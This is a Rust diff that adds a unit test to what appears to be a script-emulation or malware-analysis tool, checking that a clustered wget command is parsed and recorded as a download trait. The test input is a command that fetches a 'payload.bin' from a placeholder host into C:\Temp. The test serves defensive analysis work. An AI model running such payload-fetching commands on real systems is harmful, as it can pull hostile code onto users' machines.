@@ -6857,6 +6857,35 @@ mod wget_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn wget_short_option_cluster_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget -qO C:\Temp\payload.bin https://wget-cluster.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-cluster.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.bin"#));
+    }
 }
 
 #[cfg(test)]
